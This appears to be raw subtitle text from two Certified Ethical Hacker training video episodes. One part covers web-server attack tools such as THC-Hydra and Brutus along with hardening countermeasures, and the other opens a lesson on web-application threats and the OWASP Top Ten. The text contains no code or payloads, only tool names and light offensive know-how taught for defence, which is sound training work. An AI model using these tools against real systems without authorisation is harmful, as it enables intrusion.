00:38:40.070\nRemember, I showed you in\none of the demos we did\n\n909\n00:38:40.070 --> 00:38:42.440\nwhen we were doing the session hijacking.\n\n910\n00:38:42.440 --> 00:38:45.990\nI used the Zap proxy and I was able\nto essentially pause the get request,\n\n911\n00:38:45.990 --> 00:38:47.700\ngrab the thing.\n\n912\n00:38:47.700 --> 00:38:50.647\nGo in to modify the pack URL and\nthen send it on.\n\n913\n00:38:50.647 --> 00:38:53.340\nSo WFetch would allow us\nto do stuff like this.\n\n914\n00:38:53.340 --> 00:38:57.040\nWe can test the performance of\nwebsite pages using active code,\n\n915\n00:38:57.040 --> 00:38:59.460\nyou can do all sorts of stuff with it,\nso it's kind of cool.\n\n916\n00:38:59.460 --> 00:39:01.770\nThere's Brutus, there's THC-Hydra.\n\n917\n00:39:01.770 --> 00:39:05.130\nThese are password cracking tools for\nweb servers that are pretty popular.\n\n918\n00:39:05.130 --> 00:39:06.930\nThey've been around for a long time.\n\n919\n00:39:06.930 --> 00:39:09.480\nA lot of people are using these.\n\n920\n00:39:09.480 --> 00:39:12.500\nThinking about just countermeasures,\nright, as we talk\n\n921\n00:39:12.500 --> 00:39:16.000\nabout hacking web servers and all\nthe things that can go on and go wrong.\n\n922\n00:39:16.000 --> 00:39:18.890\nOviously, the standard stuff\napplies as we talked about.\n\n923\n00:39:18.890 --> 00:39:20.930\nMaking sure that we're trying\nto segment our network, so\n\n924\n00:39:20.930 --> 00:39:25.690\nthat web servers as you pointed out don't\ntalk directly back to back end systems.\n\n925\n00:39:25.690 --> 00:39:27.592\nWe have a DMZ some sort of firewall.\n\n926\n00:39:27.592 --> 00:39:31.690\nWe wanna make sure that we create zones\nof trust and protection perimeters.\n\n927\n00:39:31.690 --> 00:39:35.720\nSpecify internal versus external networks\nand control the movement of traffic,\n\n928\n00:39:35.720 --> 00:39:36.940\nit's gonna be very important.\n\n929\n00:39:36.940 --> 00:39:39.690\nStandard stuff like patching and\nupdating of patches.\n\n930\n00:39:39.690 --> 00:39:44.210\nCountermeasures such as making sure we\nblock unnecessary services and protocols.\n\n931\n00:39:44.210 --> 00:39:49.000\nOnly use secure protocols,\nmaking sure that we're using tunneling and\n\n932\n00:39:49.000 --> 00:39:50.770\nencryption as we've talked about.\n\n933\n00:39:50.770 --> 00:39:54.987\nDisable WebDAV, right, if it's not being\nused, which is a huge, huge issue.\n\n934\n00:39:54.987 --> 00:39:57.990\nWe've been talking about getting\nrid of WebDAV forever and a day.\n\n935\n00:39:57.990 --> 00:40:01.179\nAnd so that's just something that leads\nto all sorts of potential problems.\n\n936\n00:40:01.179 --> 00:40:05.210\nBecause of insecure code authentication\nconcerns, all sorts of things there.\n\n937\n00:40:05.210 --> 00:40:07.727\nMaking sure all unnecessary\naccounts are removed.\n\n938\n00:40:07.727 --> 00:40:11.313\nMaking sure default accounts\nhave complex passwords.\n\n939\n00:40:11.313 --> 00:40:14.747\nMaking sure you use service accounts,\nas opposed to local user accounts.\n\n940\n00:40:14.747 --> 00:40:18.404\nThere's just all this stuff you gotta\nthink about that's the standard stuff that\n\n941\n00:40:18.404 --> 00:40:19.892\nwe would normally tell you to do.\n\n942\n00:40:19.892 --> 00:40:20.910\nYou just have to apply it.\n\n943\n00:40:20.910 --> 00:40:22.750\nFile and directory permissions.\n\n944\n00:40:22.750 --> 00:40:25.620\nMaking sure that we\nare locking down directories.\n\n945\n00:40:25.620 --> 00:40:30.551\nMaking sure we don't give directories\nany more exposure than is absolutely\n\n946\n00:40:30.551 --> 00:40:31.405\nnecessary.\n\n947\n00:40:31.405 --> 00:40:34.321\nSo whether it's through robots.txt and\nblocking them,\n\n948\n00:40:34.321 --> 00:40:36.879\nor removing unnecessary\ndata from the web server so\n\n949\n00:40:36.879 --> 00:40:41.150\nthat there's nothing there that people\nmay see if they do directory traverse.\n\n950\n00:40:41.150 --> 00:40:44.300\nEliminate files like\nunnecessary files JAR files for\n\n951\n00:40:44.300 --> 00:40:46.370\ninstance dot JAR files get rid of those.\n\n952\n00:40:46.370 --> 00:40:50.680\nGet rid of and disable directory listings,\nweb dav is a problem for some of this.\n\n953\n00:40:50.680 --> 00:40:55.344\nMake sure sensitive configurations are not\nstored locally as we talked about.\n\n954\n00:40:55.344 --> 00:40:59.758\nAny kind of non-web file should be removed\nfrom there, making sure that we're doing\n\n955\n00:40:59.758 --> 00:41:02.970\nlogging so that we can track\nwhat's happening on the boxes.\n\n956\n00:41:02.970 --> 00:41:03.917\nVery important.\n\n957\n00:41:03.917 --> 00:41:07.030\nYou're detecting hacking attempts,\nmaking sure we're monitoring.\n\n958\n00:41:07.030 --> 00:41:09.500\nMaking sure we're logging,\nbut centrally logging, so\n\n959\n00:41:09.500 --> 00:41:11.270\nwe pull the data out of that system.\n\n960\n00:41:11.270 --> 00:41:12.440\nDon't leave it there.\n\n961\n00:41:12.440 --> 00:41:16.037\nUse file integrity checkers against\nfiles that we don't wanna have modified.\n\n962\n00:41:16.037 --> 00:41:18.760\nWe're talking a look at that and\nhow to do that before.\n\n963\n00:41:18.760 --> 00:41:23.048\nMaking sure we locked down a monitor for\nrandom and unusual port usage.\n\n964\n00:41:23.048 --> 00:41:26.307\nMake sure we deal with folks\non service certificates.\n\n965\n00:41:26.307 --> 00:41:29.398\nAgain, perhaps,\nnot using self assigned certificates but\n\n966\n00:41:29.398 --> 00:41:33.094\nusing third party certificates from\na trusted external vendor will give\n\n967\n00:41:33.094 --> 00:41:37.190\nus an additional layer of, excuse me,\ncontrol and capabilities there.\n\n968\n00:41:37.190 --> 00:41:43.139\nIf we're on a Linux system, take a look\nat config files, machine.config.\n\n969\n00:41:43.139 --> 00:41:46.757\nA lot of the config files there, that\nhave to be modified or maybe modified,\n\n970\n00:41:46.757 --> 00:41:48.080\nshould be monitored.\n\n971\n00:41:48.080 --> 00:41:51.265\nWanna make sure we are thinking\nabout code access, security.\n\n972\n00:41:51.265 --> 00:41:55.695\nSo we're taking a look at making sure in\nthe Windows world anyway configuring IIS\n\n973\n00:41:55.695 --> 00:41:58.104\nto reject URL's with\nthe dot dot dash in it so\n\n974\n00:41:58.104 --> 00:42:01.560\nwe don't have directory\ntraversal attack capabilities.\n\n975\n00:42:01.560 --> 00:42:05.515\nWe should have restriction of active code\nexecution which we have policies to try to\n\n976\n00:42:05.515 --> 00:42:08.801\nprevent some of that, depending on\nthe nature of what we're doing.\n\n977\n00:42:08.801 --> 00:42:13.260\nYou should be doing URL scans and\nlooking at hardening your services.\n\n978\n00:42:13.260 --> 00:42:15.570\nPrevent SQL server injection attacks.\n\n979\n00:42:15.570 --> 00:42:19.351\nAll this kind of stuff are things that\nwe definitely would want to make sure we\n\n980\n00:42:19.351 --> 00:42:23.431\nare thinking about, we're considering\nusing dedicated hardware for hosting,\n\n981\n00:42:23.431 --> 00:42:25.460\nif we're gonna do virtual machines.\n\n982\n00:42:25.460 --> 00:42:27.624\nIsolate them on a multi-tenant\nenvironment, so\n\n983\n00:42:27.624 --> 00:42:29.065\nthat web servers are together and\n\n984\n00:42:29.065 --> 00:42:32.323\nyou're not gonna infect other machines\npotentially, if we hack into it.\n\n985\n00:42:32.323 --> 00:42:34.776\nThis is just common stuff that\nwe would wanna think about.\n\n986\n00:42:34.776 --> 00:42:38.669\nPutting proxy servers in place,\nif possible, to further offset and\n\n987\n00:42:38.669 --> 00:42:40.759\nfurther hide what may be happening.\n\n988\n00:42:40.759 --> 00:42:44.680\nMaking sure we're defending against\nDNS hijacking, so DNSSEC, and\n\n989\n00:42:44.680 --> 00:42:49.010\nreverse authentication all the kind\nof stuff that we often think about.\n\n990\n00:42:49.010 --> 00:42:51.470\nWill be important we've talk\nabout patch management and\n\n991\n00:42:51.470 --> 00:42:53.100\nthe importance of patch management.\n\n992\n00:42:53.100 --> 00:42:58.519\nCan't say enough about centralizing patch\nmanagement and just the need to do that.\n\n993\n00:42:58.519 --> 00:43:01.936\nOne of things we often don't talk about\nwith patch management is making sure you\n\n994\n00:43:01.936 --> 00:43:03.772\nhard code the authorized download sites,\n\n995\n00:43:03.772 --> 00:43:06.545\nwhich many vendors do in their\npatch management software.\n\n996\n00:43:06.545 --> 00:43:11.168\nBut some malware will go in and\nmodify that, and redirect you to the site\n\n997\n00:43:11.168 --> 00:43:15.583\nwhere you download the bad malware\nunder the guise of good malware.\n\n998\n00:43:15.583 --> 00:43:18.220\nOr good patches rather thinking that\nthey're good but they're actually malware.\n\n999\n00:43:18.220 --> 00:43:19.670\nIs there such a thing as good malware?\n\n1000\n00:43:19.670 --> 00:43:20.406\nI'm free associating randomly.\n\n1001\n00:43:20.406 --> 00:43:22.521\n&gt;&gt; It depends on whose side\nyou're on I guess right?\n\n1002\n00:43:22.521 --> 00:43:24.300\n&gt;&gt; I guess yeah.\nWell it's good if you're the bad actor and\n\n1003\n00:43:24.300 --> 00:43:24.930\nyou get it in there.\n\n1004\n00:43:24.930 --> 00:43:26.188\nBad if you're the person receiving it.\n\n1005\n00:43:26.188 --> 00:43:26.920\nSo.\n&gt;&gt; Look it work.\n\n1006\n00:43:26.920 --> 00:43:27.590\nIt compromised.\n\n1007\n00:43:27.590 --> 00:43:29.847\n&gt;&gt; I guess that may be\nsomething to consider.\n\n1008\n00:43:29.847 --> 00:43:32.317\nSo you just want to be thinking\nabout patch management and\n\n1009\n00:43:32.317 --> 00:43:33.710\nnot allowing redirects there.\n\n1010\n00:43:33.710 --> 00:43:34.970\nThat's gonna be important.\n\n1011\n00:43:34.970 --> 00:43:38.910\nYeah, there are a lot of different web\napplication security suites out there.\n\n1012\n00:43:38.910 --> 00:43:44.440\nThere's sci-hunt, there's n stalker,\nthere is wik two.\n\n1013\n00:43:44.440 --> 00:43:48.795\nThere's acunetics, there's all these\ndifferent ones that are web vulnerability\n\n1014\n00:43:48.795 --> 00:43:50.461\nscanners and security suites.\n\n1015\n00:43:50.461 --> 00:43:55.048\nThere's hack alert which is malware\ninfection monitoring infrastructure that's\n\n1016\n00:43:55.048 --> 00:43:55.830\ncloud based.\n\n1017\n00:43:55.830 --> 00:43:58.410\nWhich is kind of cool keeps an eye\non your web service for you.\n\n1018\n00:43:58.410 --> 00:44:00.059\nEverything today is Cloud based.\n\n1019\n00:44:00.059 --> 00:44:05.749\nThere's, Qualys is what I'm trying to say.\n\n1020\n00:44:05.749 --> 00:44:07.752\n&gt;&gt; [LAUGH]\n&gt;&gt; I keep seeing an extra s there.\n\n1021\n00:44:07.752 --> 00:44:09.972\nQualysGuard, malware detection,\n\n1022\n00:44:09.972 --> 00:44:14.475\nanother big one that's out there\nthat scans for malware on websites.\n\n1023\n00:44:14.475 --> 00:44:17.535\nA lot of these are cloud based\nsystems today that you can leverage.\n\n1024\n00:44:17.535 --> 00:44:21.565\nThere's all sorts of non-cloud\nbased web security tools.\n\n1025\n00:44:21.565 --> 00:44:24.389\nRetina CS, a big one that's\nbeen around for a long time.\n\n1026\n00:44:25.730 --> 00:44:26.832\nEnd scan.\n\n1027\n00:44:26.832 --> 00:44:28.150\nThere's infiltrator.\n\n1028\n00:44:28.150 --> 00:44:29.660\nThere's web cruise.\n\n1029\n00:44:29.660 --> 00:44:31.660\nThere's saint scanner, that's a big one.\n\n1030\n00:44:31.660 --> 00:44:32.940\n&gt;&gt; Yeah.\n&gt;&gt; That's always cool.\n\n1031\n00:44:32.940 --> 00:44:35.554\nThat got its start back\nin the Linux systems.\n\n1032\n00:44:35.554 --> 00:44:36.800\nDot Defender.\n\n1033\n00:44:36.800 --> 00:44:39.560\nThere's a lot of different ones out there\nthat would be, you know, worthwhile for\n\n1034\n00:44:39.560 --> 00:44:40.860\nyou to take a look at.\n\n1035\n00:44:40.860 --> 00:44:42.134\nYou're slacking off there a little bit,\nbuddy.\n\n1036\n00:44:42.134 --> 00:44:43.458\nI'm actually done talking\n&gt;&gt; [LAUGH]\n\n1037\n00:44:43.458 --> 00:44:46.330\n&gt;&gt; And have nothing up there.\n\n1038\n00:44:46.330 --> 00:44:48.811\nMister I worked on my typing\nskills to keep up with you.\n\n1039\n00:44:48.811 --> 00:44:49.700\nI'm just saying.\n\n1040\n00:44:49.700 --> 00:44:50.590\n&gt;&gt; I got all those names.\n\n1041\n00:44:50.590 --> 00:44:51.916\nNow I just go to back and\ndo the searching.\n\n1042\n00:44:51.916 --> 00:44:54.014\n&gt;&gt; I'm just starting. [LAUGH] &gt;&gt; All\nright, well we'll see what happens.\n\n1043\n00:44:54.014 --> 00:44:56.010\nI'm a skeptical person now.\n\n1044\n00:44:56.010 --> 00:44:57.856\nI don't see it up there.\n\n1045\n00:44:57.856 --> 00:44:59.610\n&gt;&gt; [LAUGH]\n&gt;&gt; I'm not believing it.\n\n1046\n00:44:59.610 --> 00:45:02.300\nAll right but, those are the kind of tools\nthat we'd wanna be looking at here and\n\n1047\n00:45:02.300 --> 00:45:05.570\nobviously, be thinking about\nas part of our discussion.\n\n1048\n00:45:06.850 --> 00:45:09.106\n&gt;&gt; All right Adam another\nreal good look there.\n\n1049\n00:45:09.106 --> 00:45:11.277\nThis one we were looking\nat hacking websites.\n\n1050\n00:45:11.277 --> 00:45:14.850\nAnd started off with just the methodology.\n\n1051\n00:45:14.850 --> 00:45:17.920\nTook a look at some of the things that\nwe have to face when we're hosting or\n\n1052\n00:45:17.920 --> 00:45:18.930\nrunning web servers.\n\n1053\n00:45:18.930 --> 00:45:22.540\nSome of the tools that we can\nuse to attack those web servers,\n\n1054\n00:45:22.540 --> 00:45:24.120\nthat might be used to\nattack those web servers.\n\n1055\n00:45:24.120 --> 00:45:27.050\nAnd then also, some of the mitigation\ntechniques, or some of the things\n\n1056\n00:45:27.050 --> 00:45:31.450\nthat we might be able to do to prevent\nthose attacks from being successful.\n\n1057\n00:45:31.450 --> 00:45:32.730\nSo we thank you for that Adam.\n\n1058\n00:45:32.730 --> 00:45:34.550\nWe hope everybody out\nthere enjoyed watching.\n\n1059\n00:45:34.550 --> 00:45:37.210\nSigning off for ITProTV,\nI'm Mike Roderick.\n\n1060\n00:45:37.210 --> 00:45:38.368\n&gt;&gt; I'm Adam Gordon.\n\n1061\n00:45:38.368 --> 00:45:42.426\n&gt;&gt; And we'll see you next time.\n\n1062\n00:45:42.426 --> 00:45:47.546\n[MUSIC]\n\n",

00:00:19.056\nI'm your host Mike Rodrick, and today\nwe're doing our Certified Ethical Hacker,\n\n4\n00:00:19.056 --> 00:00:19.610\nVersion 9.\n\n5\n00:00:19.610 --> 00:00:21.370\nAnd, specifically, in this episode,\n\n6\n00:00:21.370 --> 00:00:25.030\nwe're gonna be taking a look at\nhacking web applications, right?\n\n7\n00:00:25.030 --> 00:00:28.378\nIn previous episodes, we've talked\nabout hacking the web server itself,\n\n8\n00:00:28.378 --> 00:00:31.050\nthe platform that's hosting\nthese applications.\n\n9\n00:00:31.050 --> 00:00:34.737\nNow we wanna take a look at some of\nthe vulnerabilities that running those\n\n10\n00:00:34.737 --> 00:00:37.101\napplications on our web\nserver exposes us to.\n\n11\n00:00:37.101 --> 00:00:39.303\nAnd here to help us with\nthat is Mr Adam Gordon.\n\n12\n00:00:39.303 --> 00:00:40.580\nHow you doing Adam?\n\n13\n00:00:40.580 --> 00:00:41.270\nI'm good.\nI'm good.\n\n14\n00:00:41.270 --> 00:00:43.270\nHopefully everybody out\nthere is doing well.\n\n15\n00:00:43.270 --> 00:00:46.822\nSo as Mike was saying, we're gonna talk\na bit about, almost like a part two.\n\n16\n00:00:46.822 --> 00:00:52.329\nWe break these out as separate thought\nprocesses, separate knowledge areas,\n\n17\n00:00:52.329 --> 00:00:56.535\nseparate episodes to keep you able to,\nthat makes no sense.\n\n18\n00:00:56.535 --> 00:00:59.984\n[CROSSTALK] Where we're trying to\nkeep track of stuff is was what I was\n\n19\n00:00:59.984 --> 00:01:00.777\ntrying to say.\n\n20\n00:01:00.777 --> 00:01:03.552\nSo, only one cup of espresso this morning,\n\n21\n00:01:03.552 --> 00:01:07.312\nhard to get all the engine\ncircuits firing at the same time.\n\n22\n00:01:07.312 --> 00:01:11.538\nSo what we're trying to do here is\nactually make sure that we differentiate,\n\n23\n00:01:11.538 --> 00:01:16.023\nas Mike was saying, between the server,\nwhich is the backend platform, right,\n\n24\n00:01:16.023 --> 00:01:19.598\nand then the web apps,\nwhich typically are the front end services\n\n25\n00:01:19.598 --> 00:01:24.018\nthat are being provided or interacted with\nby either end users or other systems,\n\n26\n00:01:24.018 --> 00:01:26.000\nor whatever the case may be.\n\n27\n00:01:26.000 --> 00:01:28.460\nWe provide an interface\nbetween the end user and\n\n28\n00:01:28.460 --> 00:01:31.090\nthe web server when we use a web app.\n\n29\n00:01:31.090 --> 00:01:33.220\nIt is a two-stage thought process,\n\n30\n00:01:33.220 --> 00:01:38.150\nand it is a split in the architecture\nthat, as hackers, we want to be aware of\n\n31\n00:01:38.150 --> 00:01:42.620\nbecause hackers will seek to exploit\nvulnerabilities in both of these areas.\n\n32\n00:01:42.620 --> 00:01:46.130\nAs security professionals,\nas people that are on the front lines\n\n33\n00:01:46.130 --> 00:01:49.270\nattempting to defend,\nwe have to understand that\n\n34\n00:01:49.270 --> 00:01:53.540\nour presentation of defense cannot\njust focus strictly at one layer.\n\n35\n00:01:53.540 --> 00:01:56.870\nIf we just focus on the server\nthen everything will be really\n\n36\n00:01:56.870 --> 00:01:59.510\ntightly protected physically and\nlogically.\n\n37\n00:01:59.510 --> 00:02:03.110\nWhere we actually store data, but\nthe problem is the on ramps and\n\n38\n00:02:03.110 --> 00:02:05.060\nthe endpoints that are coming in and\n\n39\n00:02:05.060 --> 00:02:09.390\nthe pipes that are coming in to actually\naccess the data, will be insecure.\n\n40\n00:02:09.390 --> 00:02:10.654\nAnd as a result of that,\n\n41\n00:02:10.654 --> 00:02:13.892\nwe may actually run into issues\nlike SQL command injection.\n\n42\n00:02:13.892 --> 00:02:14.818\nWe'll talk about this.\n\n43\n00:02:14.818 --> 00:02:16.539\nWe have a set of episodes on that.\n\n44\n00:02:16.539 --> 00:02:19.548\nAnd that's, obviously, something for\nyou to take a look at, and\n\n45\n00:02:19.548 --> 00:02:23.175\nit's like a part three in this block of\nknowledge as we drill even further down.\n\n46\n00:02:23.175 --> 00:02:26.781\nAlso, there's a lot of stuff\nthat we have to consider,\n\n47\n00:02:26.781 --> 00:02:31.566\nand I almost often times will think\nabout this as set of concentric rings.\n\n48\n00:02:31.566 --> 00:02:36.398\nAnd so as I think about web server, web\napplication, and SQL command injection or\n\n49\n00:02:36.398 --> 00:02:40.739\ngeneric sequin injection attacks,\nI think a lot about the fact that these\n\n50\n00:02:40.739 --> 00:02:45.730\nare related to each other, but they are\nparts of a concentric circle architecture.\n\n51\n00:02:45.730 --> 00:02:49.390\nThat really as we drill through,\nthe server sits in the middle,\n\n52\n00:02:49.390 --> 00:02:53.020\nthe applications are the ring that\nwill kind of form around that, and\n\n53\n00:02:53.020 --> 00:02:55.080\nSQL injection is on the outside,\n\n54\n00:02:55.080 --> 00:02:59.800\nbecause we're pushing that through the\napplication into the server core, right?\n\n55\n00:02:59.800 --> 00:03:01.500\nAnd we're trying to execute it there and\n\n56\n00:03:01.500 --> 00:03:06.160\nof course behind that there will be\ndatabases and things that in theory,\n\n57\n00:03:06.160 --> 00:03:09.480\ndepending on how we set stuff up,\npotentially full prey to those attacks so\n\n58\n00:03:09.480 --> 00:03:13.600\nwe'll talk more about how that works and\nwhy that's such an issue as we go along.\n\n59\n00:03:13.600 --> 00:03:17.640\nI know that's always, for you anyway,\nsomething that's of interest because of\n\n60\n00:03:17.640 --> 00:03:20.150\nall the work you do with\ndatabase Yeah absolutely.\n\n61\n00:03:20.150 --> 00:03:22.635\n&gt;&gt; So,\nMike secretly is Mister SQL injection.\n\n62\n00:03:22.635 --> 00:03:25.340\n&gt;&gt; [LAUGH]\n&gt;&gt; We don't talk about that but\n\n63\n00:03:25.340 --> 00:03:28.940\nhe actually is the madness\nbehind the method,\n\n64\n00:03:28.940 --> 00:03:31.480\nas opposed to the method\nbehind the madness.\n\n65\n00:03:31.480 --> 00:03:32.200\nIt is, it is.\n\n66\n00:03:32.200 --> 00:03:35.540\nAll right, so, you see the evil\nmaniacal smile by the way.\n\n67\n00:03:35.540 --> 00:03:37.790\nThat's what he looks like when\nhe's sitting at his keyboard and\n\n68\n00:03:37.790 --> 00:03:38.740\nactually\n&gt;&gt; [LAUGH]\n\n69\n00:03:38.740 --> 00:03:40.640\n&gt;&gt; Actually creating sql yeah just\n\n70\n00:03:40.640 --> 00:03:42.195\nlike that, that's truly scary.\n\n71\n00:03:42.195 --> 00:03:43.620\n&gt;&gt; [LAUGH]\n&gt;&gt; You shouldn't do that in front of\n\n72\n00:03:43.620 --> 00:03:44.145\npeople.\n\n73\n00:03:44.145 --> 00:03:46.003\n&gt;&gt; [LAUGH]\n&gt;&gt; You'll scare small animals and\n\n74\n00:03:46.003 --> 00:03:46.593\nchildren.\n\n75\n00:03:46.593 --> 00:03:48.571\n&gt;&gt; I was wondering why little\nchildren cry when I walk up.\n\n76\n00:03:48.571 --> 00:03:49.544\n&gt;&gt; That would be why.\n\n77\n00:03:49.544 --> 00:03:50.549\nYes, exactly.\n\n78\n00:03:50.549 --> 00:03:53.377\n&gt;&gt; [LAUGH]\n&gt;&gt; It's the maniacal eyes that you have\n\n79\n00:03:53.377 --> 00:03:54.880\ngoing on there.\n\n80\n00:03:54.880 --> 00:03:57.660\nAll right, so let's talk about\nsome web application threats.\n\n81\n00:03:57.660 --> 00:04:02.020\nI know that there are many,\nmany different threats that exist.\n\n82\n00:04:02.020 --> 00:04:05.420\nWe've talked extensively in other\nepisodes, we're gonna remind you about it\n\n83\n00:04:05.420 --> 00:04:09.970\nhere as well, about the OWASP Top Ten\nWeb Application Vulnerability List.\n\n84\n00:04:09.970 --> 00:04:13.035\nWe're gonna talk about some of those,\nand we'll kind of hit the highlights,\n\n85\n00:04:13.035 --> 00:04:14.825\nreview some of the key\nones that are there.\n\n86\n00:04:14.825 --> 00:04:16.855\nMike's gonna help me to\ndo that in just a minute.\n\n87\n00:04:16.855 --> 00:04:20.115\nWe do have other web application\nthreats and vulnerabilities that may or\n\n88\n00:04:20.115 --> 00:04:21.555\nmay not be on that list.\n\n89\n00:04:21.555 --> 00:04:25.434\nRemember, any list we give you\ngenerically is not going to be exhaustive\n\n90\n00:04:25.434 --> 00:04:29.389\nin the sense that we can't account for\neverything, right, in the list.\n\n91\n00:04:29.389 --> 00:04:34.193\nBut what we do wanna understand\nis that ultimately we wanna\n\n92\n00:04:34.193 --> 00:04:38.800\ntry to figure out how to account for\nas much as possible,\n\n93\n00:04:38.800 --> 00:04:43.519\n[LAUGH] as much as possible\nwithin our discussions right?\n\n94\n00:04:43.519 --> 00:04:46.744\nAnd so when we think about any kind\nof list, especially one like this,\n\n95\n00:04:46.744 --> 00:04:50.353\nwhere we're gonna go through some\ncommon web application vulnerabilities,\n\n96\n00:04:50.353 --> 00:04:52.867\nwe wanna just remind you,\nright, very importantly,\n\n97\n00:04:52.867 --> 00:04:56.880\nthat we're not gonna list every potential\nvulnerability that exists out there.\n\n98\n00:04:56.880 --> 00:05:00.430\nAnd so as a result you're gonna see and\nhear about common ones.\n\n99\n00:05:00.430 --> 00:05:02.140\nThere may be many that you're aware of,\n\n100\n00:05:02.140 --> 00:05:05.380\nas you watch this at some point,\nthat we may not talk about.\n\n101\n00:05:05.380 --> 00:05:09.130\nYou may have a favorite, don't want you\nto feel in any way insulted or put off,\n\n102\n00:05:09.130 --> 00:05:10.910\ncuz we didn't put it on the top ten list.\n\n103\n00:05:10.910 --> 00:05:12.315\nMike did ask for input.\n\n104\n00:05:12.315 --> 00:05:15.088\nBut we didn't get a lot, so\nwe went with what we came up with.\n\n105\n00:05:15.088 --> 00:05:17.760\nAnd ultimately-\n&gt;&gt; [LAUGH]\n\n106\n00:05:17.760 --> 00:05:18.387\n&gt;&gt; It is what it is.\n\n107\n00:05:18.387 --> 00:05:20.431\nWhat can I tell you?\n\n108\n00:05:20.431 --> 00:05:24.045\nBut for part two, if you do wanna submit\nyour favorites to Mike, he will code them\n\n109\n00:05:24.045 --> 00:05:27.525\nand turn them back to you as malware,\nthat you could execute on your machine.\n\n110\n00:05:27.525 --> 00:05:28.730\n&gt;&gt; [LAUGH]\n&gt;&gt; If you would like, so\n\n111\n00:05:28.730 --> 00:05:29.735\nfeel free to do that.\n\n112\n00:05:29.735 --> 00:05:34.920\nWe'll be taking those submissions\nat hack.me at ITPro.TV,\n\n113\n00:05:34.920 --> 00:05:38.720\nand Mike will be happy to get back to\nyou with a nasty surprise in your inbox.\n\n114\n00:05:38.720 --> 00:05:39.620\nI'm kidding.\n\n115\n00:05:39.620 --> 00:05:40.456\nI'm kidding.\n\n116\n00:05:40.456 --> 00:05:42.220\n&gt;&gt; [LAUGH]\n&gt;&gt; I'm not being serious.\n\n117\n00:05:42.220 --> 00:05:45.940\nBut I am just pointing out that when we do\ngo through lists like this, we just wanna\n\n118\n00:05:45.940 --> 00:05:48.940\nmake sure that we hit the highlights\ntraditionally, because of the key ones\n\n119\n00:05:48.940 --> 00:05:52.580\nthat we wanna make sure a, you're aware\nof, obviously, from an exam perspective.\n\n120\n00:05:52.580 --> 00:05:56.260\nThere will be ones that are much\nmore likely than others to show up.\n\n121\n00:05:56.260 --> 00:05:59.990\nThere's also so many new things\nthat constantly are occurring\n\n122\n00:05:59.990 --> 00:06:02.630\nin the real world, in the wild,\nthat would be impossible for\n\n123\n00:06:02.630 --> 00:06:05.300\nus to keep up with all of them,\nin any given moment in time.\n\n124\n00:06:05.300 --> 00:06:06.600\nAnd so we hit the highlights, and\n\n125\n00:06:06.600 --> 00:06:09.900\nthat's really what we want you\nto perceive a list like this as.\n\n126\n00:06:09.900 --> 00:06:14.440\nIt's the top five, top ten, top whatever,\nbut the reality is there's many,\n\n127\n00:06:14.440 --> 00:06:16.790\nmany more out there, and\nyou just wanna be aware of that.\n\n128\n00:06:16.790 --> 00:06:19.390\nAll right, so\nwe do have two things we wanna talk about.\n\n129\n00:06:19.390 --> 00:06:20.840\nProbably, up first the top ten list.\n\n130\n00:06:20.840 --> 00:06:24.110\nJust to remind you about what it is and\nwhere to get it.\n\n131\n00:06:24.110 --> 00:06:26.340\nThis is from the OWASP Top Ten website.\n\n132\n00:06:26.340 --> 00:06:30.640\nSo OWASP, but\nwe've put the URL up many times.\n\n133\n00:06:30.640 --> 00:06:34.790\nWhen you go out to the OWASP Top Ten\nproject site, and you take a look for\n\n134\n00:06:34.790 --> 00:06:38.340\nthis, and we've talked about the fact that\nwe're in the middle of that transition\n\n135\n00:06:38.340 --> 00:06:43.760\nbetween the 2013 and 2016 list, that will\nbe out late in 2016, probably early 2017,\n\n136\n00:06:43.760 --> 00:06:47.120\ndepending on when you're watching this,\nso just keep that in mind.\n\n137\n00:06:47.120 --> 00:06:50.980\nThis may look a little different to you,\nright, the list that you go to live versus\n\n138\n00:06:50.980 --> 00:06:54.120\nthe list we'll go through, by the time\nyou see this recording, depending on,\n\n139\n00:06:54.120 --> 00:06:56.790\nultimately, when this\nepisode is viewed by you.\n\n140\n00:06:56.790 --> 00:06:58.775\nBut a lot of the stuff on\nthis list is gonna be there,\n\n141\n00:06:58.775 --> 00:07:01.920\nmaybe just jump around and reorder\na little bit, right, things like that.\n\n142\n00:07:01.920 --> 00:07:04.400\nSo we are going to hit the highlights and\ndefine some of this.\n\n143\n00:07:04.400 --> 00:07:05.278\nWe're not gonna do it in the list.\n\n144\n00:07:05.278 --> 00:07:08.630\nWe are gonna do it through another\nlist we put together for you, but\n\n145\n00:07:08.630 --> 00:07:10.510\njust showing you, the top ten.\n\n146\n00:07:10.510 --> 00:07:12.520\nWe have the injection attacks.\n\n147\n00:07:12.520 --> 00:07:15.225\nWe have broken authentication and\nsession management.\n\n148\n00:07:15.225 --> 00:07:16.495\nWe have cross-site scripting.\n\n149\n00:07:16.495 --> 00:07:17.655\nWe've talked a lot about that.\n\n150\n00:07:17.655 --> 00:07:19.765\nWe had a whole discussion on that and\n\n151\n00:07:19.765 --> 00:07:22.805\nactually showed you how to execute\na cross-site scripting attack.\n\n152\n00:07:22.805 --> 00:07:24.675\nWe did a little diagram on that.\n\n153\n00:07:24.675 --> 00:07:26.860\nSo you were kind enough to\nput that together for us.\n\n154\n00:07:26.860 --> 00:07:29.410\n&gt;&gt; We have insecure\ndirect object references,\n\n155\n00:07:29.410 --> 00:07:32.000\nthat's where we leave stuff in\nthe code that should not be there.\n\n156\n00:07:32.000 --> 00:07:36.710\nThings like directory paths,\nright, for instance, and names\n\n157\n00:07:36.710 --> 00:07:41.140\nof certain files, that are in certain\ndirectories, that could be referenced\n\n158\n00:07:41.140 --> 00:07:44.680\nthrough a variable that would be hidden,\nright, cuz we don't wanna expose that.\n\n159\n00:07:44.680 --> 00:07:47.360\nSo that could be the kind of stuff,\nalso a lot of times,\n\n160\n00:07:47.360 --> 00:07:49.490\nwe'll hard code usernames in there.\n\n161\n00:07:49.490 --> 00:07:50.670\n&gt;&gt; Yes.\n&gt;&gt; And that's also gonna be obviously-\n\n162\n00:07:50.670 --> 00:07:51.280\n&gt;&gt; Connection strings.\n\n163\n00:07:51.280 --> 00:07:52.069\n&gt;&gt; An issue.\n&gt;&gt; Yeah.\n\n164\n00:07:52.069 --> 00:07:53.728\n&gt;&gt; Connection strings, credentials, right?\n\n165\n00:07:53.728 --> 00:07:55.551\nAll the things we know\nwe should not do but\n\n166\n00:07:55.551 --> 00:07:58.240\nunfortunately Are sometimes\ndone by developers, right.\n\n167\n00:07:58.240 --> 00:07:59.992\nSo that is something to consider.\n\n168\n00:07:59.992 --> 00:08:01.980\nGeneral security misconfigurations.\n\n169\n00:08:01.980 --> 00:08:06.960\nThis is just bad architecture, bad\nimplementation, lack of 